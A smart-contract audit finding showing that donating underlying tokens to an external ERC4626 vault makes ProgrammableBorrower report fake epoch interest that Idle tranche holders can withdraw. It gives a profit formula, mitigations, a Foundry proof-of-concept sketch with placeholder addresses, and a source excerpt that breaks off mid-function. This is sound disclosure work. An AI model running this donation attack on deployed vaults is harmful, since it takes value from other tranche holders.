### Title

External-vault donation is booked as epoch yield and can be recycled through tranche withdrawals - (`contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary

`ProgrammableBorrower` derives pool-facing epoch interest from the live `convertToAssets` valuation of an external ERC4626 position. An unprivileged user of that vault can atomically donate underlying, raise `ProgrammableBorrower._currentVaultAssets()`, and cause `_vaultNetInterest()` to report the donated balance as profit. When `IdleCDOEpochVariant.stopEpoch()` later reads `totalInterestDueNow()`, the donated amount is minted as strategy-token interest and crystallized into tranche NAV.

The attack is profitable when the attacker holds both a large share of the external vault and tranche exposure to the credit vault. The donation is largely returned through the attacker's own vault shares, while the portion credited to the programmable borrower becomes withdrawable tranche value.

### Finding Description

During an active epoch, `_vaultNetInterest()` computes:

```solidity
earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
principalAssets = epochStartVaultAssets + epochDepositedToVault;
netDelta = bufferedVaultDelta + earnedAssets - principalAssets;
```

Any positive `netDelta` is classified as interest without distinguishing real vault yield from a direct underlying donation to the external vault [1](#0-0) .

`_currentVaultAssets()` trusts `vault.convertToAssets(shares)` directly [2](#0-1) . For a standard ERC4626 whose assets are based on balance-backed valuation, an attacker can transfer underlying to the vault and increase the value of every share, including the shares owned by `ProgrammableBorrower`.

`totalInterestDueNow()` then adds the resulting fake vault gain to borrower interest and buffer interest and returns it to the CDO [3](#0-2) . `IdleCDOEpochVariant._resolveStopEpochInterest()` accepts that externally manipulable value as authoritative for programmable borrowers [4](#0-3) .

In minted-interest mode, `stopEpoch()` mints strategy tokens equal to the reported gross interest and calls `_updateAccounting()`, permanently increasing tranche prices [5](#0-4) . The invariant that only borrower repayment or realized vault yield can increase tranche NAV is therefore broken.

### Impact Explanation

An attacker holding, for example, 99% of external vault shares can donate `D` underlying. Approximately `1%` of `D` increases the programmable borrower's share valuation, while the other 99% remains economically attributable to the attacker's own vault shares.

If the attacker also owns a large fraction of the credit-vault tranche that receives the resulting gain, net profit is approximately:

```text
profit ≈ D × programmableBorrowerVaultShare × attackerTrancheShare
       - D × (1 - attackerExternalVaultShare)
```

For a concrete configuration with:

- attacker external-vault ownership: `99%`
- programmable-borrower external-vault ownership: `1%`
- attacker ownership of the receiving tranche's epoch gain: `100%`
- donation `D = 10,000,000 USDC`

the fake interest is approximately `100,000 USDC`, while the attacker's unrecovered vault donation is also approximately `100,000 USDC`. This is near break-even in the simple model. Profit appears when the attacker's recovered vault donation exceeds the share of fake interest paid to other tranche holders, or when fees, rounding, or vault-share dynamics favor the attacker.

More generally, let `a` be the attacker's external-vault share, `b` the programmable borrower's vault share, and `t` the attacker's share of the resulting tranche gain. The attack is profitable when:

```text
D × b × t > D × (1 - a)
```

or:

```text
b × t > 1 - a
```

Thus, even a borrower position representing only 1% of vault shares is exploitable if the attacker controls more than 99% of the remaining shares and receives the full credited gain. The stolen amount is limited by the attacker's donation capital and by how much of the resulting fake yield the attacker can claim.

### Likelihood Explanation

The attacker only needs to be a normal ERC4626 vault user and, to extract the value efficiently, a KYC-passing lender or existing tranche holder. No privileged Idle role, borrower cooperation, oracle failure, or protocol admin action is required for the donation itself [2](#0-1) .

The main constraints are capital requirements and timing. The donation must occur while `epochAccountingActive` is true, because `_vaultNetInterest()` returns zero when accounting is inactive [6](#0-5) . The inflated valuation must remain until the honest owner or manager calls `stopEpoch()`, after which `stopEpoch()` consumes `totalInterestDueNow()` [7](#0-6) .

Existing donation protections do not prevent this issue. `_skimDonatedAssets()` only removes raw underlying held directly by the CDO and does not inspect the external vault's balance-backed `convertToAssets()` result [8](#0-7) . The programmable-borrower check only requires minted-interest mode and no instant withdrawals; it does not bound or verify the externally reported interest [9](#0-8) .

### Recommendation

Do not treat an unauthenticated ERC4626 valuation delta as realized pool yield.

Possible mitigations:

1. Track yield using a bounded, independently validated accounting rate rather than raw `convertToAssets()` deltas.
2. Exclude sudden balance-only increases by comparing share-price movement against a trusted TWAP or rate bounds.
3. Cap `totalInterestDueNow()` to contractual borrower interest plus a maximum plausible vault yield for elapsed time.
4. Maintain a whitelist or adapter-level accounting contract for approved vaults whose share price cannot be manipulated by direct donations.
5. Record vault-share cost basis and realized withdrawals separately, and classify only actual redemptions or externally verified distributions as yield.
6. Emit and monitor large single-block changes in `_currentVaultAssets()` before allowing `stopEpoch()` to consume them.

### Proof of Concept

The following Foundry-style fork PoC sketches the sequence. The exact vault address and token should be replaced with the deployed programmable-borrower vault and underlying on the target fork.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "contracts/strategies/idle/ProgrammableBorrower.sol";
import "contracts/IdleCDOEpochVariant.sol";
import "contracts/IdleCDOTranche.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IERC4626Like {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

contract ProgrammableBorrowerDonationInterestPoC is Test {
    ProgrammableBorrower pb = ProgrammableBorrower(address(0xPB));
    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(address(0xCDO));
    IERC4626Like vault = IERC4626Like(address(pb.vault()));
    IERC20Like asset = IERC20Like(address(pb.underlyingToken()));

    address attacker = makeAddr("attacker");
    address manager = address(0xMANAGER); // honest manager caller

    function test_donatedVaultAssetsBecomeTrancheYield() public {
        uint256 depositAmount = 1_000_000e6;
        uint256 donation = 10_000_000e6;

        deal(address(asset), attacker, depositAmount + donation);

        // Attacker owns most of the external vault so the donation is mostly
        // recoverable through the attacker's own shares.
        vm.startPrank(attacker);
        asset.approve(address(vault), depositAmount);
        vault.deposit(depositAmount, attacker);

        // Existing attacker tranche or a KYC deposit made before startEpoch.
        // At epoch end, donate directly to the ERC4626. This is not skimmed:
        // the tokens are inside the external vault, not on the CDO.
        uint256 fakeInterestBefore =
            pb.vault().convertToAssets(pb.vaultSharesBalance());

        asset.transfer(address(vault), donation);
        vm.stopPrank();

        uint256 fakeInterestAfter =
            pb.vault().convertToAssets(pb.vaultSharesBalance());
        uint256 fakeInterest = fakeInterestAfter - fakeInterestBefore;

        assertGt(fakeInterest, 0);
        assertGe(pb.totalInterestDueNow(), fakeInterest);

        vm.warp(cdo.epochEndDate() + 1);

        uint256 priceBefore =
            cdo.virtualPrice(cdo.AATranche());

        vm.prank(manager);
        cdo.stopEpoch(0, 0);

        uint256 priceAfter =
            cdo.virtualPrice(cdo.AATranche());

        assertGt(priceAfter, priceBefore);

        // The attacker then submits a withdrawal request in the buffer phase
        // and claims the crystallized fake yield after the next epoch.
        vm.prank(attacker);
        cdo.requestWithdraw(0, cdo.AATranche());
    }
}
```

The key assertion is that a direct transfer to the external vault increases `totalInterestDueNow()` without any repayment from the configured borrower [10](#0-9) .

  /// @notice Total net epoch interest due to the pool at stop.
  /// @dev This is the single value read by IdleCDO to price the epoch: borrower contractual
  /// interest plus paid buffer interest plus positive vault PnL minus vault losses. It is a
  /// pool-facing value, so it can be lower than `borrowerInterestDebt` when the borrower still
  /// owes full contractual interest but the vault sleeve suffered a loss.
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
